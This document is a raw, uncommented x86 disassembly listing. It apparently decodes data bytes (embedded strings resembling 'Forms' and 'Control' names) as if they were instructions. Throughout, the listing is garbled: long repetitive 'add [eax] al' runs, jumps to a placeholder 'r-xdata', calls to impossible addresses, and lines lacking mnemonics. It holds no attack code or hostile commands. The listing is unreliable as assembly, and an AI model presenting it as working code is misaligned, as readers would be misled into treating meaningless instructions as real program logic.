add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ebp + ecx * 2 + 0x4e900042 ] dl
imul esi [ ebp + eax + 0x46 ] 0x736d726f
dec esp
jb r-xdata
dec edi
inc edi
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
add [ eax ] al
add [ eax ] bl
push esi
inc esp
add [ eax + 0x50 ] ah
inc edi
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 + 0x55900047 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bl
push ebx
inc edi
add [ esi + 0x55 ] bh
inc edi
push esi
inc esp
add [ eax + eax ] dl
add bh bh
adc [ ecx + 0x48 ] al
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ 0x68676952 ] al
je r-xdata
add al 0x4c
je r-xdata
insd
insb
push ecx
inc edi
add [ edi ] al
or edx [ edi + eax * 2 + 0x6c ]
popad
jae r-xdata
inc edx
add [ eax + 0x1000424e ] bl
add [ eax + eax - 0x6c ] 0x9000424d
dec esi
outsd
outsb
push es
jo r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
popad
jae r-xdata
jae r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ ebx + eax ] bh
add [ edi + edi - 0x7d93ffb9 ] bl
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff879352d4
push esi
inc esp
add [ eax ] bl
add [ eax ] al
call [ eax ]
inc ecx
dec eax
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
push es
inc edx
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
inc esp
add [ eax ] dl
add [ eax ] al
call [ eax ]
inc ecx
push esp
outsd
jo r-xdata
inc esi
jb r-xdata
dec esi
nop
inc ecx
add [ eax + eax + 0x64 ] 0x94004481
dec ebp
inc edx
add [ eax - 0x67ffbdb2 ] dl
dec esi
inc edx
add [ eax ] dl
push ecx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 + 0x47 ] bl
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
mov esi 0x81480047
add eax 0x68530c00
je r-xdata
outsd
insd
sbb [ esi + 0x44 ] dl
add [ eax ] ch
add [ eax ] al
push [ eax + 0x41 ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x5c004789 ] dh
jne r-xdata
add [ eax - 0x42 ] dh
inc edi
add [ eax - 0x7f ] cl
inc di
insb
popad
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add edx [ edi + ebp * 2 + 0x70 ]
insb
insd
dec esp
push ecx
inc edi
add [ ebp + ebx + 0x42 ] dl
add [ esi ] al
add [ 0x6d726f46 ] al
jae r-xdata
in al 0xce
dec eax
add [ esp + edx * 4 + 0xa540047 ] cl
dec ecx
add al al
in al 0x47
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffff88479bf3
xchg esi eax
inc edi
add [ ebp + edx * 4 + 0x47 ] al
add [ eax ] al
dec eax
add [ edi + edx * 4 - 0x311fffb9 ] al
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x63ffb87d ] cl
lahf
inc edi
add [ eax ] al
sub eax 0xb3f40049
inc edi
add [ ebx + edi * 4 + 0x47 ] bh
add [ eax - 0x67ffb847 ] al
sub eax 0x2dbc0049
dec ecx
add al bh
mov esp 0xbe2c0047
inc edi
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax ] dl
nop
inc edi
add al al
dec ebp
inc edx
add al al
mov eax [ edi ]
inc esp
mov [ edi ] es
or [ ebp - 0x2287ffb9 ] 0x48
add [ edx + ebp * 8 ] dl
inc edx
add [ edi + edx * 4 + 0x47 ] al
add [ eax ] dl
out 0x42 eax
add [ eax + ebp * 8 ] dl
inc edi
add [ ebp + eax * 4 + 0x6f800047 ] ah
dec ecx
add [ ebp + esi * 2 + 0x74d80049 ] cl
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add [ eax + 0x3c004793 ] al
dec cx
add ah ah
into
fisttp [ eax ]
adc al 0xea
nop
nop
lodsb [ esi ]
push edx
inc edi
add [ eax ] al
jmp eax
add [ eax ] bl
push esi
inc esp
add [ eax ] cl
push cs
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax + ebp * 2 + 0x49 ] bh
add [ ebp + eax * 8 + 0x47 ] ah
add [ eax ] cl
jge r-xdata
add [ edx + eax + 0x4cd00000 ] dl
inc edi
add [ eax + 0x4000002 ] ch
dec ebp
inc edi
add [ eax + 0x34000002 ] bh
dec ebp
inc edi
add [ ebx + eax ] al
add [ ebp ] al
sldt [ ebp + 0x27001400 ]
add [ edi ] dh
add [ ecx - 0x5eff7c00 ] al
add [ edx ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
inc esp
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add [ edi + ebx * 8 + 0x7d680047 ] ah
inc edi
add [ eax ] bl
add [ edi ] 0x38
into
inc edi
add ah ah
mov al [ edi ]
pushad
mov eax [ edi ]
add al 0xe4
inc edi
add [ eax ] al
mov [ edi ] eax
mov dh bl
inc edi
add [ eax ] al
rol [ edi ] 0x7c
loopne r-xdata
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ ebx + 0x17b00000 ] al
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x48
mov al 0x45
mov al 0x44
mov al 0x40
mov al 0x3f
mov al 0xb0
[ edi - 0x13001201 ]
and [ ecx ] al
pop ds
add [ eax ] al
les edx [ esi + 0x44 ]
add [ esi + edx * 4 + 0xe0047 ] al
add [ eax ] al
add [ eax ] al
add al 0x0
sub_4742ba
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0xbc004481
jl r-xdata
dec ecx
add [ esi ] bh
dec ecx
add ah ah
into
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd4478c1b
jle r-xdata
add [ ebp + esi * 2 + 0x49 ] bl
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax - 0x7fffb87c ] bl
outsd
dec ecx
add [ ebp + esi * 2 + 0x74d80049 ] cl
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
pop es
add [ eax + ebp * 2 + 0x49 ] bh
add [ eax + 0x8004785 ] ah
jge r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax + 0x48004783 ] cl
jge r-xdata
add [ eax ] al
adc eax 0x75410a00
je r-xdata
insb
insb
inc edx
outsd
js r-xdata
aam 0x42
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax + 0x7d ] ch
inc edi
add [ eax ] bl
add [ edi ] 0x4c
add [ edi ] 0x2
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax ] al
sub eax 0x85040049
inc edi
add al al
sub [ ecx ] ecx
or [ ebp + 0x47 ] bh
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
outsb
outsb
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
sbb [ esi + 0x44 ] dl
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ eax ] cl
inc ecx
jne r-xdata
add [ eax + eax - 0x7a974ff0 ] al
inc edi
add [ ebp + eax * 4 + 0x47 ] dh
add [ edx ] cl
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
outsd
js r-xdata
inc edi
add [ eax ] bl
inc ecx
inc edi
add [ eax ] dl
add eax 0x6d726f46
jae r-xdata
inc edx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add al dl
jno r-xdata
inc edi
add [ eax + 0x7d ] cl
inc edi
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
nop
nop
fadd [ ebx + 0x47 ]
add [ edi ] al
add [ eax ] eax
call [ edi + esi * 2 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] bl
add [ edx ] cl
inc edx
jbe r-xdata
test al 0x8e
dec eax
add [ ecx - 0x3700ffff ] ch
ja r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
cmpsb [ esi ] [ edi ]
add [ eax ] eax
[ eax + 0x1004977 ]
add bh bh
push esp
ja r-xdata
sbb [ esi + 0x44 ] dl
add [ eax + 0x2 ] ch
add bh bh
les edi [ esi + 0x47 ]
jle r-xdata
add [ ebx ] bl
add bh bh
pushad
ror [ eax ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax [ eax ]
add eax 0x67696c41
outsb
push 0x6100487b
add [ eax ] al
[ edi + ecx * 8 - 0x2f37ffb8 ]
add [ eax + 0x4208001c ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
inc edx
inc edi
add [ eax + 0x2 ] bh
insb
dec edi
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or [ edx + 0x65 ] eax
jbe r-xdata
add [ eax ] al
add [ edx ] bl
add [ ecx ] cl
inc edx
jbe r-xdata
insb
inc ebp
jae r-xdata
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] bl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
dec ecx
add [ ecx ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
add bh bh
push esp
test [ edi ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jb r-xdata
sbb eax 0x6f420b00
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
lodsb [ esi ]
add [ eax ] eax
add [ eax ] eax
call [ edi + esi * 2 + 0x49 ]
add [ eax ] al
sbb eax [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
insb
inc edx
jne r-xdata
add [ eax + 0x440e0020 ] al
outsd
jne r-xdata
add bh bh
or [ ebx + 0x49 ] dl
je r-xdata
pop ss
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax + 0x430b001e ] al
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
xchg esp eax
loopne r-xdata
add [ eax ] cl
inc esp
jb r-xdata
add [ eax ] al
insb
sbb al 0x7c
dec eax
add [ eax ] dh
add bh bh
mov [ ecx + ecx * 2 ] cs
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jae r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ebx ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add eax 0x336c7443
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
add [ eax + eax ] cl
jb r-xdata
cwde
jno r-xdata
add bh bh
and cl ah
dec eax
add [ ecx + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050025 ] al
outsd
insb
outsd
jb r-xdata
jb r-xdata
add [ eax ] al
xor ah 0xff
add [ edx + ebp * 2 + 0x49 ] dh
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x44561873
add ah ah
add [ eax ] eax
call [ eax + 0x52 ]
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ eax ] cl
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x18 ] 0x54004456
add al [ eax ]
dec [ eax ]
push ebx
dec ecx
add [ eax + 0x1 ] al
sub [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ eax + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040027 ] al
outsd
outsb
je r-xdata
add [ ecx + edx * 8 ] ch
add [ edx ] bh
add bh bh
jpe r-xdata
inc esp
les edi [ ecx + 0x640046 ]
add bh bh
loopne r-xdata
add [ 0x336c7443 ] al
push esi
inc esp
add cl ah
add [ eax ] eax
inc [ edx + ebp * 2 + 0x49 ]
add [ eax + 0x6a ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050026 ] al
je r-xdata
add [ eax ] 0x0
jpe r-xdata
dec ecx
add [ ecx ] al
outsb
je r-xdata
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
int3
jle r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
and [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
sbb [ esi + 0x44 ] dl
xor eax [ esp + eax * 8 - 0x47 ]
inc esi
add [ eax + eax ] ah
jmp [ eax + 0x48 ]
add [ eax ] al
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
dec eax
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
jge r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
add [ ecx + eax + 0x7e00ff00 ] dh
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50070028 ] al
popad
imul ebp [ fs : esi + 0x67 ] r-xdata
pushad
add [ eax ] al
[ eax + eax ]
jmp [ eax ]
jb r-xdata
add al cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
je r-xdata
loopne r-xdata
outsb
je r-xdata
jb r-xdata
add [ ebx ] cl
push eax
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
inc esp
add ch ah
add [ eax ] eax
inc [ eax + 0x100496a ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61501400
outsb
je r-xdata
push 0x49
add [ ebx + ebp * 2 ] ch
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax ] al
xor eax [ eax + ebx + 0x56 ]
inc esp
add dh ah
add [ eax ] eax
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ cs : edx ] cl
push eax
popad
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
add [ eax + edx * 2 ] dl
popad
outsd
insb
outsd
inc [ edi + ebx * 8 + 0x48 ]
outsb
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
or edx [ eax + 0x61 ]
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
outsb
je r-xdata
pop ds
inc esi
add [ eax + eax ] bh
sbb [ esi + 0x44 ] dl
imul ebp [ esi + 0x74 ] r-xdata
lodsb [ esi ]
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
mov al 0xde
dec eax
add [ eax ] bl
or [ ecx ] cl
add [ eax ] al
add [ eax + 0x1 ] al
xor al 0x0
pop es
jo r-xdata
das
add [ eax + 0x1 ] al
outsd
jne r-xdata
je r-xdata
jne r-xdata
push 0x6948776f
jpe r-xdata
cmp [ eax ] 0x0
jpe r-xdata
add [ esi ] cl
push eax
popad
jb r-xdata
push esi
inc esp
add [ edx - 0x1b010000 ] cl
loopne r-xdata
loopne r-xdata
outsb
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
insb
inc edx
jne r-xdata
inc esp
sbb [ fs : esi + 0x44 ] dl
add [ edx ] bl
add bh bh
je r-xdata
add bh bh
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ edx + ebp * 2 + 0x6b2c0049 ] ch
add [ eax ] al
js r-xdata
add [ eax ] al
add bh bh
shl al 0x48
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc [ ebx + ebp * 2 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add bh bh
inc esp
imul ecx [ ecx ] 0x1
add [ eax ] cl
push ebx
push esi
inc esp
add [ ecx - 0x3f010000 ] cl
loopne r-xdata
add [ eax ] 0x0
jb r-xdata
add [ eax ] al
sub al [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
sub eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
jb r-xdata
loopne r-xdata
push eax
outsd
jo r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x20656c62
test [ eax ] ecx
mov al 0x0
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0b00
inc ebx
popad
outsb
push edx
jae r-xdata
add [ edi ] al
add [ edi ] dl
push esi
inc esp
add [ eax + 0x48e0 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080031 ] al
add [ eax + 0x50090030 ] al
outsd
sbb [ fs : esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
pushfd
inc edi
je r-xdata
add [ eax + 0x4f0a003b ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add bh bh
[ eax ] eax
or [ eax ] 0xff0000d8
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
dec eax
add al bl
add [ eax ] al
jo r-xdata
inc esp
imul esi [ ebp + 0x49 ] 0x186f666e
or [ eax ] 0x28
add [ eax ] eax
[ eax ]
add [ eax ] 0x0
add [ eax + 0x4f09003f ] al
inc esp
jb r-xdata
push cs
adc al 0x42
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0039 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe946499e
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003a ] al
outsb
jae r-xdata
adc al 0x42
add al bh
add [ eax ] eax
jo r-xdata
jb r-xdata
jo r-xdata
add [ eax + 0x4f10004a ] al
dec ebp
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ecx ] cl
dec edi
or [ eax ] 0xff0000e0
loopne r-xdata
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
or [ eax ] 0xf8
add [ eax ] al
add al ah
add [ eax ] al
jmp eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
or [ eax ] 0xfffffff0
add [ eax ] eax
push eax
add [ eax ] eax
push ebx
je r-xdata
push edi
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
cmp al 0x7f
dec eax
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090048 ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0a00
inc esp
jb r-xdata
imul esp eax 0x2b
inc edx
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x40 ] bp
or [ eax ] 0x0
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004e ] al
outsb
push ebx
je r-xdata
test al 0x86
dec eax
add [ eax + 0x1 ] dl
add bh bh
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e004b ] al
outsd
jne r-xdata
push ebp
jo r-xdata
add [ eax ] al
dec edi
jbe r-xdata
or [ ecx + 0x4f ] cl
add bh bh
call [ eax + 0x474d0890 ]
add [ edi ] cl
add eax 0x6d726f46
jae r-xdata
in al dx
insb
invd
dec ecx
dec edi
jb r-xdata
inc esp
jb r-xdata
push edi
push 0x556c6565
jo r-xdata
outsb
push edi
xchg [ eax ] cl
inc eax
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ecx
add [ edi + ecx * 2 ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jae r-xdata
pushad
push edi
inc esp
add [ ecx ] al
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
inc esi
outsd
jb r-xdata
fadd [ bp + di + 0x48 ]
sub [ edx ] al
add bh bh
sub [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
outsb
dec ebp
push cs
dec edi
adc al 0x42
add al ch
add [ eax ] al
add [ eax ] cl
dec edi
outsb
push edx
jae r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax + 0x4f070040 ] al
add [ eax ] 0x0
adc al 0x42
add [ eax ] al
add al [ eax ]
inc [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060041 ] al
outsb
inc ebp
js r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jb r-xdata
jae r-xdata
dec edi
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x2c ] bp
dec esp
inc edi
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
outsd
jpe r-xdata
push 0xa86c6565
xchg [ eax ] cl
dec eax
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ eax ] dl
dec edi
dec esp
popad
jbe r-xdata
inc esi
add [ edi + ecx * 2 ] cl
outsb
cmp al 0x7f
dec eax
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0044 ] al
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
insb
je r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
call [ eax + 0x4d389090 ]
inc edi
add [ ecx ] dl
push cs
push esp
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] cl
dec eax
test [ eax ] cl
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004d ] al
outsb
outsb
dec ebp
outsd
jne r-xdata
dec edi
mov ah 0x7f
dec eax
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0047 ] al
outsb
dec ebp
outsd
jne r-xdata
outsd
ja r-xdata
inc esp
outsd
arpl [ ebx - 0x78 ] bp
or [ eax ] 0x8
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
test [ eax ] cl
or [ edx ] al
add bh bh
or [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ 0x65476e4f ] cl
je r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
insd
dec ebp
outsb
jne r-xdata
nop
inc esi
outsd
jb r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
inc edi
add [ esi ] al
or al 0x54
jns r-xdata
add ecx [ ebx ]
push esp
inc edx
jo r-xdata
push 0x446c6565
outsd
ja r-xdata
outsd
jbe r-xdata
dec ebp
add [ eax ] al
add [ esi + ecx * 2 + 0x64090047 ] dh
insd
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
mov eax 0x300474e
je r-xdata
popad
js r-xdata
